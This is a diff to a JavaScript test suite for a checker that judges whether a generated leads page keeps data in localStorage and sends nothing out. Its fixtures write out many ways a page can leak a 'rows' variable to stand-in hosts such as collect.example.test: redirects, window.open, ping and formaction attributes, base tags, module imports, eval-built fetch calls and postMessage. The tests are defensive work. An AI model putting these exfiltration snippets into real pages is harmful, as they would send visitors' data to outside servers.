@@ -8,12 +8,16 @@ import test from "node:test";
 
 import { DISPLAY_RESULT_CASES, DISPLAY_TRACKING_CASES, LIVE_PAGE_CONTRACT_COUNT, gapChecks } from "./gap-catalog-display.mjs";
 import {
+  CODE_SINKS,
   LEADS_COLUMNS,
   LIVE_PAGE_JUDGES,
   SEND_PATTERNS,
+  SET_ATTRIBUTE_SINK,
   judgeLeadsHtml,
   judgeLeadsPage,
   leadsPagePath,
+  lexScript,
+  scriptBodies,
 } from "./fin-b07-leads-page.mjs";
 import { PULSE_REGISTRY } from "../registry.mjs";
 
@@ -151,6 +155,10 @@ const SENDERS = {
   "loads a script file": { extraBody: '<script src="/x.js"></script>' },
   "loads a file from another address": { extraHead: '<link rel="stylesheet" href="https://cdn.example.test/x.css">' },
   "sends the visitor on by itself (meta refresh)": { extraHead: '<meta http-equiv="refresh" content="0;url=/x">' },
+  "pings a server from a link (ping attribute)": { extraBody: '<a href="/x" ping="https://collect.example.test/p">x</a>' },
+  "posts from a button or input (formaction)": { extraBody: '<button type="submit" formaction="https://collect.example.test/p">x</button>' },
+  "changes where every link goes (a base tag)": { extraHead: '<base href="https://other.example.test/">' },
+  "loads a style or font from another address": { extraHead: '<style>@font-face{font-family:x;src:url(https://fonts.example.test/x.woff2)}</style>' },
 };
 
 test("every way a page can send data out is held by a pattern, and each one turns the row red", async () => {
@@ -252,4 +260,132 @@ test("the pure judge answers held and broke in plain words, and ignores the orde
   const bad = judgeLeadsHtml("");
   assert.equal(bad.ok, false);
   assert.equal(bad.broke.length, 3, "no noindex, no columns, no localStorage; nothing sends");
+});
+
+// ── Generation 3: the ways a page can send data that have no "fetch" in them ─────────────────────────
+
+/* One snippet per code-level sink. Every snippet keeps localStorage get and set in it, so the only broken
+   promise is the send. The table must cover every sink the judge holds. */
+const KEEPS = 'localStorage.setItem("a","b"); localStorage.getItem("a");';
+const CODE_SENDERS = {
+  "moves the visitor from script (location)": `${KEEPS} location.href = "https://collect.example.test/?d=" + JSON.stringify(rows);`,
+  "opens a window from script (open)": `${KEEPS} window.open("https://collect.example.test/?d=" + JSON.stringify(rows));`,
+  "writes into the document from script (write)": `${KEEPS} document.write('<img src="https://collect.example.test/?d=' + rows.length + '">');`,
+  "sets an address from script (href, src, formAction, ping, srcset, poster)": `${KEEPS} var a = document.createTextNode(""); a.href = "mailto:x@example.test?body=" + JSON.stringify(rows);`,
+  "builds code from text (eval, Function)": `${KEEPS} eval("fe" + "tch('/x')");`,
+  "posts a message out of the page (postMessage)": `${KEEPS} parent.postMessage(rows, "*");`,
+  "starts a worker": `${KEEPS} var w = new Worker("w.js");`,
+  "imports a module (import)": 'import { send } from "https://collect.example.test/m.js"; localStorage.setItem("a","b"); localStorage.getItem("a");',
+};
+
+test("every sink the script judge holds has a break test, and each one turns the row red by name", async () => {
+  assert.deepEqual(Object.keys(CODE_SENDERS).sort(), CODE_SINKS.map(([words]) => words).sort(),
+    "a code sink was added or removed without its break test");
+  for (const [words, script] of Object.entries(CODE_SENDERS)) {
+    const row = await leadsRow({ html: page({ script }) });
+    assert.equal(row.status, "FAIL", words);
+    assert.ok(row.detail.includes(words), `${words}: ${row.detail}`);
+    assert.doesNotMatch(row.detail, /no localStorage/, `${words}: only the send is broken`);
+  }
+  const attr = await leadsRow({ html: page({ script: `${KEEPS} var i = document.createElement("span"); i.setAttribute("src", "https://collect.example.test/?d=1");` }) });
+  assert.equal(attr.status, "FAIL");
+  assert.ok(attr.detail.includes(SET_ATTRIBUTE_SINK[0]), attr.detail);
+  const computed = await leadsRow({ html: page({ script: `${KEEPS} var n = "sr" + "c"; el.setAttribute(n, url);` }) });
+  assert.equal(computed.status, "FAIL", "an attribute name the judge cannot read is a hit");
+});
+
+test("the ten pages that read green before generation 3 are all red now", async () => {
+  const REPORTED = {
+    "script moves the visitor": page({ script: `${KEEPS} location.href = "https://collect.example.test/?d=" + JSON.stringify(rows);` }),
+    "script opens a window": page({ script: `${KEEPS} window.open(url + data);` }),
+    "script sets src with setAttribute": page({ script: `${KEEPS} img.setAttribute('src', url);` }),
+    "a link with a ping attribute": page({ extraBody: '<a href="/x" ping="https://collect.example.test/p">x</a>' }),
+    "a module script that imports from another address": page({ extraBody: '<script type="module">import { x } from "https://collect.example.test/m.js";</script>' }),
+    "a base tag to another address": page({ extraHead: '<base href="https://other.example.test/">' }),
+    "a mailto link built by script": page({ script: `${KEEPS} var a = {}; a.href = "mailto:x@example.test?body=" + JSON.stringify(rows);` }),
+    "localStorage only in a comment": page({ script: "// localStorage was removed from this page\nvar rows = [];" }),
+    "localStorage only in a string": page({ script: 'var note = "we used localStorage once"; sessionStorage.setItem("a", note); sessionStorage.getItem("a");' }),
+  };
+  for (const [name, html] of Object.entries(REPORTED)) {
+    const row = await leadsRow({ html });
+    assert.equal(row.status, "FAIL", name);
+  }
+  const control = await leadsRow({ html: page() });
+  assert.equal(control.status, "PASS", "the control page is still green");
+});
+
+test("edits kept in the browser means the script writes AND reads localStorage in code, not in a comment or a string", async () => {
+  const cases = {
+    "only writes": { script: 'localStorage.setItem("a", JSON.stringify(rows));', ok: false },
+    "only reads": { script: 'var rows = JSON.parse(localStorage.getItem("a") || "[]");', ok: false },
+    "the word in a block comment": { script: '/* localStorage.setItem localStorage.getItem */ var rows = [];', ok: false },
+    "the calls inside a string": { script: 'var s = "localStorage.setItem(); localStorage.getItem()";', ok: false },
+    "sessionStorage instead": { script: 'sessionStorage.setItem("a","b"); sessionStorage.getItem("a");', ok: false },
+    "a helper over window.localStorage": { script: 'var store = window.localStorage; function put(v){ store.setItem("a", v); } function get(){ return store.getItem("a"); }', ok: true },
+  };
+  for (const [name, c] of Object.entries(cases)) {
+    const row = await leadsRow({ html: page({ script: c.script }) });
+    assert.equal(row.status, c.ok ? "PASS" : "FAIL", name);
+  }
+});
+
+test("ordinary page code that merely shares a word with a sink is not a send", async () => {
+  const row = await leadsRow({ html: page({ script: `${KEEPS}
+    var state = { data: [], action: "idle" }; state.data = rows; state.action = "saving";
+    var el = { style: {} }; el.style.background = "#fff"; function openRow(i) { return rows[i]; } openRow(0);
+    var where = { location: "table" }; var kind = where.place;` }) });
+  // "location" as a key is still the word; only the bare word as an identifier is a hit, so this one is red by design
+  assert.equal(row.status, "FAIL");
+  assert.match(row.detail, /location/);
+  const quiet = await leadsRow({ html: page({ script: `${KEEPS}
+    var state = { data: [], action: "idle" }; state.data = rows; state.action = "saving";
+    var el = { style: {} }; el.style.background = "#fff"; function openRow(i) { return rows[i]; } openRow(0);` }) });
+  assert.equal(quiet.status, "PASS", quiet.detail);
+});
+
+test("a download of the visitor's own rows (an address made inside the browser) is not a send, a remote address is", async () => {
+  const local = await leadsRow({ html: page({ script: `${KEEPS} var blob = new Blob([JSON.stringify(rows)]); var a = {}; a.href = URL.createObjectURL(blob);` }) });
+  assert.equal(local.status, "PASS", local.detail);
+  const windowed = await leadsRow({ html: page({ script: `${KEEPS} var a = {}; a.href = window.URL.createObjectURL(new Blob([rows]));` }) });
+  assert.equal(windowed.status, "PASS", windowed.detail);
+  const remote = await leadsRow({ html: page({ script: `${KEEPS} var a = {}; a.href = "https://collect.example.test/?d=" + JSON.stringify(rows);` }) });
+  assert.equal(remote.status, "FAIL");
+  const concatenated = await leadsRow({ html: page({ script: `${KEEPS} var a = {}; a.href = base + URL.createObjectURL(blob);` }) });
+  assert.equal(concatenated.status, "FAIL", "an address built from more than the blob address is not the blob address");
+});
+
+test("words in a comment or a string are not a send, but the same words in code are", async () => {
+  const quiet = page({
+    script: `${KEEPS}
+      // location.href = "x"; window.open("y"); fetch("/z")
+      /* eval("a"); import("b"); document.write("c") */
+      var note = "To open( the file, change location and import data; fetch is not used";
+      var re = /open\\(|location|fetch\\(/g; var half = rows.length / 2;`,
+  });
+  const row = await leadsRow({ html: quiet });
+  assert.equal(row.status, "PASS", row.detail);
+  const inTemplate = await leadsRow({ html: page({ script: `${KEEPS} var s = \`total \${fetch("/x")}\`;` }) });
+  assert.equal(inTemplate.status, "FAIL", "code inside a template expression is code");
+  const inHandler = await leadsRow({ html: page({ extraBody: '<button onclick="location.href=\'https://collect.example.test/\'">x</button>' }) });
+  assert.equal(inHandler.status, "FAIL", "an inline handler is a script");
+  const inJsLink = await leadsRow({ html: page({ extraBody: '<a href="javascript:window.open(1)">x</a>' }) });
+  assert.equal(inJsLink.status, "FAIL", "a javascript: link is a script");
+});
+
+test("a script that cannot be read to its end is red, never green", async () => {
+  for (const script of ['var a = "unterminated;', "var b = 1; /* never closed", "var c = `open template ${"]) {
+    const row = await leadsRow({ html: page({ script: `${KEEPS} ${script}` }) });
+    assert.equal(row.status, "FAIL", script);
+    assert.match(row.detail, /could not be read/);
+  }
+});
+
+test("the lexer separates what a script does from what it says", () => {
+  const out = lexScript('var u = "http://x.test/a"; // fetch(1)\nvar v = \'it\\\'s\' + /\'/.test(u) + 4 / 2; /* open( */');
+  assert.equal(out.ok, true);
+  assert.doesNotMatch(out.code, /fetch|open|x\.test/);
+  assert.match(out.full, /http:\/\/x\.test\/a/, "the string text is kept in the full view");
+  assert.doesNotMatch(out.full, /fetch|open\(/, "comments are gone from both views");
+  assert.match(out.code, /4 \/ 2/, "a division is left as a division");
+  assert.deepEqual(scriptBodies('<script>a()</script><script src="/x.js"></script><button onclick="b()">x</button><a href="javascript:c()">y</a>'), ["a()", "b()", "c()"]);
 });
